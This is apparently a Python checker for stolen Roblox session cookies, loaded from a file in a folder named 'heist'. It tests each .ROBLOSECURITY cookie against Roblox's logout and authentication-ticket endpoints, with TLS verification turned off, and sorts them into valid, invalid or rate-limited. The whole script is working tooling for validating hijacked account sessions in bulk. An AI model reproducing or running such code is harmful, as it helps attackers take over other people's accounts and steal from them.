import aiohttp
import asyncio
import json
import ssl
import re

COOKIE_PATH = "/root/heist-v3/heist/shared/rbxcookies.json"

session = None
connector = None

async def ensure_session():
    global session, connector
    if connector is None:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        connector = aiohttp.TCPConnector(ssl=ssl_context)
    if session is None or session.closed:
        session = aiohttp.ClientSession(connector=connector)

def load_cookies():
    print("[LOAD] loading cookies")
    try:
        data = json.load(open(COOKIE_PATH, "r", encoding="utf-8"))
        raw = data.get("cookies", [])
    except Exception as e:
        print("[LOAD] failed", e)
        return []
    upgraded = []
    for entry in raw:
        if isinstance(entry, str):
            upgraded.append({"cookie": entry})
        else:
            upgraded.append(entry)
    print("[LOAD] total cookies", len(upgraded))
    return upgraded

async def test_csrf(cookie):
    print("[CSRF] testing csrf")
    await ensure_session()
    try:
        async with session.post("https://auth.roblox.com/v2/logout",
                                cookies={".ROBLOSECURITY": cookie}) as r:
            token = r.headers.get("x-csrf-token")
            print("[CSRF] status", r.status, "token", token)
            return token, r.status
    except Exception as e:
        print("[CSRF] exception", e)
        return None, -1

async def test_ticket(cookie, token):
    print("[TICKET] requesting")
    await ensure_session()
    headers = {
        "x-csrf-token": token,
        "referer": "https://www.roblox.com/",
        "Content-Type": "application/json",
        "Cookie": f".ROBLOSECURITY={cookie}"
    }
    try:
        async with session.post("https://auth.roblox.com/v1/authentication-ticket",
                                headers=headers) as r:
            t = r.headers.get("rbx-authentication-ticket")
            print("[TICKET] status", r.status, "ticket", t)
            return t, r.status
    except Exception as e:
        print("[TICKET] exception", e)
        return None, -1

async def classify_cookie(cookie):
    print("")
    print("============== TESTING COOKIE ==============")

    csrf_token, csrf_status = await test_csrf(cookie)

    if csrf_token is None:
        print("[RESULT] CSRF failed → likely invalid")
        return "invalid"

    ticket, t_status = await test_ticket(cookie, csrf_token)

    if t_status == 429:
        print("[RESULT] rate limited")
        return "rate_limited"

    if t_status == 403 and ticket is None:
        print("[RESULT] invalid / banned cookie")
        return "invalid"

    if ticket and t_status == 200:
        print("[RESULT] valid cookie")
        return "valid"

    print("[RESULT] unknown state")
    return "unknown"

async def main():
    cookies = load_cookies()
    if not cookies:
        print("no cookies found")
        return

    results = []
    for i, c in enumerate(cookies):
        print(f"\n========== COOKIE {i} ==========")
        res = await classify_cookie(c["cookie"])
        results.append((i, res))

    print("\n========== SUMMARY ==========")
    for idx, status in results:
        print(f"Cookie {idx}: {status}")

    if session and not session.closed:
        await session.close()

asyncio.run(main())
